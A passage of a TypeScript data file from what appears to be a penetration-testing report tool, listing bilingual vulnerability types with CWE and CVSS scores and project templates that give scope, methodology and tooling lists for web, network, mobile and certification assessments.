    { id: "vuln-auth-056", title_en: "Brute Force Attacks", title_es: "Ataques de fuerza bruta", cwe: "CWE-307", severity: "High", cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Authentication"] },
    { id: "vuln-auth-057", title_en: "Weak <APPLICATION> Admin Credentials", title_es: "Credenciales débiles de administrador en <APPLICATION>", cwe: "CWE-521", severity: "High", cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Authentication"] },
    { id: "vuln-auth-058", title_en: "Excessive Active Directory Group Privileges", title_es: "Privilegios excesivos en grupos de Active Directory", cwe: "CWE-272", severity: "High", cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "L", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Authentication"] },
    { id: "vuln-auth-059", title_en: "Passwords in AD User Description Field", title_es: "Contraseñas en campo de descripción de usuario de AD", cwe: "CWE-312", severity: "High", cvss: { score: 7.8, vectorString: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", attackVector: "L", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Authentication"] },

    // Cryptography
    { id: "vuln-crypto-060", title_en: "Weak Encryption Algorithms", title_es: "Algoritmos de cifrado débiles", cwe: "CWE-327", severity: "High", cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Cryptography"] },
    { id: "vuln-crypto-061", title_en: "Insecure Key Management", title_es: "Gestión insegura de claves", cwe: "CWE-320", severity: "High", cvss: { score: 8.5, vectorString: "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "H", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Cryptography"] },
    { id: "vuln-crypto-062", title_en: "Use of Hardcoded Secrets", title_es: "Uso de secretos embebidos", cwe: "CWE-798", severity: "High", cvss: { score: 8.2, vectorString: "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", attackVector: "L", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Cryptography"] },
    { id: "vuln-crypto-063", title_en: "Insufficient Entropy", title_es: "Entropía insuficiente", cwe: "CWE-331", severity: "Medium", cvss: { score: 6.4, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" }, ...emptyVulnBoilerplate, tags: ["Cryptography"] },
    { id: "vuln-crypto-064", title_en: "Padding Oracle Attacks", title_es: "Ataques de oráculo de relleno", cwe: "CWE-209", severity: "High", cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Cryptography"] },
    { id: "vuln-crypto-065", title_en: "Weak Random Number Generation", title_es: "Generación débil de números aleatorios", cwe: "CWE-338", severity: "Medium", cvss: { score: 6.4, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" }, ...emptyVulnBoilerplate, tags: ["Cryptography"] },
    { id: "vuln-crypto-066", title_en: "Cryptographic Flaws in Design", title_es: "Defectos criptográficos en el diseño", cwe: "CWE-311", severity: "High", cvss: { score: 8.5, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Cryptography"] },
    { id: "vuln-crypto-067", title_en: "Side-Channel Attacks", title_es: "Ataques de canal lateral", cwe: "CWE-208", severity: "Medium", cvss: { score: 6.3, vectorString: "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N", attackVector: "L", attackComplexity: "H", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Cryptography"] },
    { id: "vuln-crypto-068", title_en: "Certificate Validation Bypass", title_es: "Omisión de validación de certificados", cwe: "CWE-295", severity: "High", cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Cryptography"] },
    { id: "vuln-crypto-069", title_en: "Insecure SSL/TLS Configuration", title_es: "Configuración insegura de SSL/TLS", cwe: "CWE-326", severity: "High", cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Cryptography"] },

    // Additional
    { id: "vuln-add-070", title_en: "Buffer Overflow", title_es: "Desbordamiento de búfer", cwe: "CWE-120", severity: "High", cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-071", title_en: "Format String Vulnerabilities", title_es: "Vulnerabilidades de cadena de formato", cwe: "CWE-134", severity: "High", cvss: { score: 7.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-072", title_en: "Race Conditions", title_es: "Condiciones de carrera", cwe: "CWE-362", severity: "High", cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:H", attackVector: "N", attackComplexity: "H", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "N", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-073", title_en: "LDAP Injection", title_es: "Inyección LDAP", cwe: "CWE-90", severity: "High", cvss: { score: 7.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-074", title_en: "XPath Injection", title_es: "Inyección XPath", cwe: "CWE-643", severity: "High", cvss: { score: 7.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-075", title_en: "Server-Side Template Injection", title_es: "Inyección de plantillas del servidor", cwe: "CWE-1336", severity: "High", cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-076", title_en: "Open-Source Vulnerabilities", title_es: "Vulnerabilidades en código abierto", cwe: "CWE-1104", severity: "Critical", cvss: { score: 9.2, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-077", title_en: "Insecure Direct Object References (IDOR)", title_es: "Referencias directas a objetos inseguras", cwe: "CWE-639", severity: "High", cvss: { score: 7.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-078", title_en: "Missing Security Headers", title_es: "Cabeceras de seguridad faltantes", cwe: "CWE-693", severity: "Medium", cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-079", title_en: "Clickjacking", title_es: "Secuestro de clics", cwe: "CWE-1021", severity: "Medium", cvss: { score: 5.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-080", title_en: "DOM-based XSS", title_es: "XSS basado en DOM", cwe: "CWE-79", severity: "Medium", cvss: { score: 6.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "C", confidentiality: "L", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-081", title_en: "Unrestricted File Upload", title_es: "Subida de archivos sin restricciones", cwe: "CWE-434", severity: "High", cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-082", title_en: "Business Logic Flaws", title_es: "Fallos en la lógica de negocio", cwe: "CWE-840", severity: "High", cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "N", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-083", title_en: "API Security Misconfiguration", title_es: "Configuración insegura de API", cwe: "CWE-16", severity: "High", cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-084", title_en: "Insecure Cookies", title_es: "Cookies inseguras", cwe: "CWE-1004", severity: "Medium", cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-085", title_en: "HTTP Response Splitting", title_es: "División de respuestas HTTP", cwe: "CWE-113", severity: "Medium", cvss: { score: 6.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-086", title_en: "Web Cache Poisoning", title_es: "Envenenamiento de caché web", cwe: "CWE-444", severity: "High", cvss: { score: 7.8, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:H/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "C", confidentiality: "L", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-087", title_en: "Host Header Injection", title_es: "Inyección en cabecera Host", cwe: "CWE-20", severity: "Medium", cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-088", title_en: "SQLi Blind", title_es: "Inyección SQL ciega", cwe: "CWE-89", severity: "High", cvss: { score: 8.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-089", title_en: "OS Command Injection", title_es: "Inyección de comandos del SO", cwe: "CWE-78", severity: "Critical", cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-090", title_en: "XSS Persistent", title_es: "XSS persistente", cwe: "CWE-79", severity: "High", cvss: { score: 7.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "R", scope: "C", confidentiality: "L", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-091", title_en: "CSRF Token Leakage", title_es: "Filtración de tokens CSRF", cwe: "CWE-200", severity: "Medium", cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-092", title_en: "JWT Vulnerabilities", title_es: "Vulnerabilidades en JWT", cwe: "CWE-345", severity: "High", cvss: { score: 7.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-093", title_en: "OAuth Misconfiguration", title_es: "Configuración incorrecta de OAuth", cwe: "CWE-359", severity: "High", cvss: { score: 7.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-094", title_en: "GraphQL Injection", title_es: "Inyección GraphQL", cwe: "CWE-943", severity: "High", cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-095", title_en: "WebSocket Security Issues", title_es: "Problemas de seguridad en WebSocket", cwe: "CWE-345", severity: "High", cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "N", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-096", title_en: "Mobile Root/Jailbreak Detection Bypass", title_es: "Omisión de detección de root/jailbreak", cwe: "CWE-602", severity: "Medium", cvss: { score: 6.2, vectorString: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L", attackVector: "L", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-097", title_en: "Insecure Deep Links", title_es: "Enlaces profundos inseguros", cwe: "CWE-200", severity: "Medium", cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "N", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-098", title_en: "Mobile App Cloning", title_es: "Clonación de aplicaciones móviles", cwe: "CWE-506", severity: "Medium", cvss: { score: 6.8, vectorString: "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L", attackVector: "L", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-099", title_en: "TCP/IP Vulnerabilities", title_es: "Vulnerabilidades TCP/IP", cwe: "CWE-345", severity: "High", cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
    { id: "vuln-add-100", title_en: "Zero-Day Exploits", title_es: "Exploits de día cero", cwe: "CWE-807", severity: "Critical", cvss: { score: 9.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Additional"] },
];

export const projectTemplates: ProjectTemplate[] = [
  {
    id: 'ptpl-1',
    name_en: 'Standard Web App Pentest',
    name_es: 'Pentest Estándar de Aplicación Web',
    description_en: 'A comprehensive security assessment for web applications, covering OWASP Top 10 and other common vulnerabilities.',
    description_es: 'Una evaluación de seguridad completa para aplicaciones web, cubriendo el OWASP Top 10 y otras vulnerabilidades comunes.',
    icon: 'Scan',
    scope_en: `## Scope
- **Application URL:** [TODO: Add application URL, e.g., https://example.com]
- **Testing Period:** [TODO Start Date] to [TODO End Date]
- **Credentials:** [TODO: Specify credentials if provided, e.g., user, admin]
- **Exclusions:** [TODO: Specify any out-of-scope targets, e.g., *.blog.example.com]

## Methodology
The assessment will follow a standard web application penetration testing methodology, including:
1.  **Reconnaissance:** Information gathering about the application and infrastructure.
2.  **Automated Scanning:** Using tools to identify low-hanging fruit.
3.  **Manual Testing:** In-depth testing for complex vulnerabilities such as business logic flaws, access control issues, and injection attacks.
4.  **Reporting:** Documentation of findings and remediation recommendations.`,
    scope_es: `## Alcance
- **URL de la Aplicación:** [TODO: Añadir URL de la aplicación, p.ej., https://ejemplo.com]
- **Periodo de Pruebas:** [TODO Start Date] a [TODO End Date]
- **Credenciales:** [TODO: Especificar credenciales si se proporcionaron, p.ej., usuario, administrador]
- **Exclusiones:** [TODO: Especificar objetivos fuera de alcance, p.ej., *.blog.ejemplo.com]

## Metodología
La evaluación seguirá una metodología estándar de pruebas de penetración de aplicaciones web, que incluye:
1.  **Reconocimiento:** Recopilación de información sobre la aplicación y la infraestructura.
2.  **Escaneo Automatizado:** Uso de herramientas para identificar vulnerabilidades de bajo esfuerzo.
3.  **Pruebas Manuales:** Pruebas en profundidad para vulnerabilidades complejas como fallos de lógica de negocio, problemas de control de acceso y ataques de inyección.
4.  **Informe:** Documentación de hallazgos y recomendaciones de remediación.`,
    appendix_en: `### A. Tooling Used
A combination of automated tools and manual techniques were used to perform this assessment.
- **Proxy:** Burp Suite Professional
- **Scanners:** Nessus, Nuclei
- **Reconnaissance:** Amass, Subfinder`,
    appendix_es: `### A. Herramientas Utilizadas
Se utilizó una combinación de herramientas automatizadas y técnicas manuales para realizar esta evaluación.
- **Proxy:** Burp Suite Professional
- **Escáneres:** Nessus, Nuclei
- **Reconocimiento:** Amass, Subfinder`
  },
  {
    id: 'ptpl-2',
    name_en: 'Internal Network Assessment',
    name_es: 'Evaluación de Red Interna',
    description_en: 'An assessment of the internal network to identify misconfigurations, vulnerable services, and pathways for lateral movement.',
    description_es: 'Una evaluación de la red interna para identificar configuraciones incorrectas, servicios vulnerables y vías para el movimiento lateral.',
    icon: 'Network',
    scope_en: `## Scope
- **IP Ranges:** [TODO: Add IP ranges, e.g., 192.168.1.0/24]
- **Testing Period:** [TODO Start Date] to [TODO End Date]
- **Assumptions:** The assessment is performed from the perspective of an attacker who has gained a foothold on the internal network (e.g., a compromised workstation).
- **Exclusions:** [TODO: Specify any out-of-scope systems]

## Methodology
1.  **Network Discovery:** Identifying live hosts and open ports.
2.  **Service Enumeration:** Fingerprinting services running on discovered ports.
3.  **Vulnerability Scanning:** Scanning for known vulnerabilities in identified services.
4.  **Manual Exploitation:** Attempting to exploit vulnerabilities to gain further access.
5.  **Active Directory Analysis:** Looking for misconfigurations in Active Directory, such as weak passwords, kerberoasting opportunities, and privilege escalation paths.
6.  **Reporting:** Documenting findings and remediation recommendations.`,
    scope_es: `## Alcance
- **Rangos IP:** [TODO: Añadir rangos IP, p.ej., 192.168.1.0/24]
- **Periodo de Pruebas:** [TODO Start Date] a [TODO End Date]
- **Supuestos:** La evaluación se realiza desde la perspectiva de un atacante que ha obtenido un punto de apoyo en la red interna (p.ej., una estación de trabajo comprometida).
- **Exclusiones:** [TODO: Especificar sistemas fuera de alcance]

## Metodología
1.  **Descubrimiento de Red:** Identificación de hosts activos y puertos abiertos.
2.  **Enumeración de Servicios:** Identificación de los servicios que se ejecutan en los puertos descubiertos.
3.  **Escaneo de Vulnerabilidades:** Búsqueda de vulnerabilidades conocidas en los servicios identificados.
4.  **Explotación Manual:** Intento de explotar vulnerabilities para obtener más acceso.
5.  **Análisis de Active Directory:** Búsqueda de configuraciones incorrectas en Active Directory, como contraseñas débiles, oportunidades de kerberoasting y rutas de escalada de privilegios.
6.  **Informe:** Documentación de hallazgos y recomendaciones de remediación.`,
    appendix_en: `### A. Tooling Used
- **Network Scanner:** Nmap, Masscan
- **Vulnerability Scanner:** Nessus
- **Active Directory:** BloodHound, Impacket
- **Manual Exploitation:** Metasploit Framework, CrackMapExec`,
    appendix_es: `### A. Herramientas Utilizadas
- **Escáner de Red:** Nmap, Masscan
- **Escáner de Vulnerabilidades:** Nessus
- **Active Directory:** BloodHound, Impacket
- **Explotación Manual:** Metasploit Framework, CrackMapExec`
  },
  {
    id: 'ptpl-3',
    name_en: 'Mobile App Pentest (iOS/Android)',
    name_es: 'Pentest de Aplicación Móvil (iOS/Android)',
    description_en: 'A security assessment of an iOS or Android mobile application, focusing on client-side vulnerabilities and backend API security.',
    description_es: 'Una evaluación de seguridad de una aplicación móvil de iOS o Android, centrada en vulnerabilidades del lado del cliente y seguridad de la API de backend.',
    icon: 'Smartphone',
    scope_en: `## Scope
- **Application:** [TODO: Add application name and package/bundle ID]
- **Platform:** iOS / Android
- **Testing Period:** [TODO Start Date] to [TODO End Date]
- **Backend APIs:** [TODO: List backend API endpoints in scope]

## Methodology
The assessment includes both static and dynamic analysis of the mobile application.
1.  **Static Analysis (SAST):** Analyzing the application binary to find hardcoded secrets, insecure configurations, and other weaknesses without running the code.
2.  **Dynamic Analysis (DAST):** Running the application on a test device (rooted/jailbroken) to analyze its runtime behavior, including:
    -   Network traffic analysis (MitM).
    -   Insecure data storage checks.
    -   IPC endpoint analysis.
    -   Runtime manipulation with Frida.
3.  **API Testing:** Testing the backend APIs for common web vulnerabilities (OWASP API Top 10).
4.  **Reporting:** Documentation of findings and remediation recommendations.`,
    scope_es: `## Alcance
- **Aplicación:** [TODO: Añadir nombre de la aplicación y ID del paquete/bundle]
- **Plataforma:** iOS / Android
- **Periodo de Pruebas:** [TODO Start Date] a [TODO End Date]
- **APIs de Backend:** [TODO: Listar endpoints de API de backend en el alcance]

## Metodología
La evaluación incluye tanto el análisis estático como el dinámico de la aplicación móvil.
1.  **Análisis Estático (SAST):** Análisis del binario de la aplicación para encontrar secretos embebidos, configuraciones inseguras y otras debilidades sin ejecutar el código.
2.  **Análisis Dinámico (DAST):** Ejecución de la aplicación en un dispositivo de prueba (rooteado/con jailbreak) para analizar su comportamiento en tiempo de ejecución, incluyendo:
    -   Análisis del tráfico de red (MitM).
    -   Comprobaciones de almacenamiento de datos inseguro.
    -   Análisis de endpoints IPC.
    -   Manipulación en tiempo de ejecución con Frida.
3.  **Pruebas de API:** Pruebas de las API de backend para vulnerabilidades web comunes (OWASP API Top 10).
4.  **Informe:** Documentación de hallazgos y recomendaciones de remediación.`,
    appendix_en: `### A. Tooling Used
- **Static Analysis:** MobSF, jadx
- **Dynamic Analysis:** Burp Suite, Frida, Objection
- **Test Devices:** Google Pixel 6 (Rooted), iPhone 12 (Jailbroken)`,
    appendix_es: `### A. Herramientas Utilizadas
- **Análisis Estático:** MobSF, jadx
- **Análisis Dinámico:** Burp Suite, Frida, Objection
- **Dispositivos de Prueba:** Google Pixel 6 (Rooteado), iPhone 12 (con Jailbreak)`
  },
  {
    id: 'ptpl-4',
    name_en: 'Certification Report',
    name_es: 'Informe de Certificación',
    description_en: 'A generic and professional template for offensive security certification reports (e.g., OSCP, CPTS). Includes all necessary sections for a complete report.',
    description_es: 'Una plantilla genérica y profesional para informes de certificaciones de seguridad ofensiva (p. ej., OSCP, CPTS). Incluye todas las secciones necesarias para un informe completo.',
    icon: 'Award',
    scope_en: `## Introduction
This report documents the results of the simulated penetration test performed in the [TODO: Certification Name] exam environment.

## Objective
The objective was to perform a penetration test, identifying and exploiting vulnerabilities to gain unauthorized access to target systems and achieve the exam objectives.

## Scope
- **Target Network:** [TODO: e.g., 10.10.10.0/24]
- **Exam Duration:** [TODO Start Date] to [TODO End Date]`,
    scope_es: `## Introducción
Este informe documenta los resultados de la prueba de penetración simulada realizada en el entorno del examen [TODO: Nombre de la Certificación].

## Objetivo
El objetivo fue realizar una prueba de penetración, identificando y explotando vulnerabilidades para obtener acceso no autorizado a los sistemas objetivo y cumplir los objetivos del examen.

## Alcance
- **Red Objetivo:** [TODO: p. ej., 10.10.10.0/24]
- **Duración del Examen:** [TODO Start Date] a [TODO End Date]`,
    appendix_en: `### A. Flags Captured
| Hostname / IP | Location | Value |
|---|---|---|
| [TODO: Hostname/IP] | [TODO: e.g., /root/proof.txt] | [TODO: Flag Value] |

### B. Tooling Used
- **Network Scanner:** Nmap
- **Web Enumeration:** Gobuster, Feroxbuster
- **Exploitation:** Metasploit, Impacket, Custom Scripts`,
    appendix_es: `### A. Banderas Capturadas
| Hostname / IP | Ubicación | Valor |
|---|---|---|
| [TODO: Hostname/IP] | [TODO: p. ej., /root/proof.txt] | [TODO: Valor de la Bandera] |

### B. Herramientas Utilizadas
- **Escáner de Red:** Nmap
- **Enumeración Web:** Gobuster, Feroxbuster
- **Explotación:** Metasploit, Impacket, Scripts Personalizados`
  }
];

// Functions to manage data (add, update, delete)
// These are illustrative and in a real app would interact with a persistent store.
export const addVulnerability = (vulnerability: Omit<Vulnerability, 'id'>) => {
  const newId = `vuln-usr-${Date.now()}`;
  const newVuln = { ...vulnerability, id: newId };
  vulnerabilities.push(newVuln);
  return newVuln;
};

export const updateVulnerability = (vulnerability: Vulnerability) => {
  const index = vulnerabilities.findIndex(v => v.id === vulnerability.id);
  if (index !== -1) {
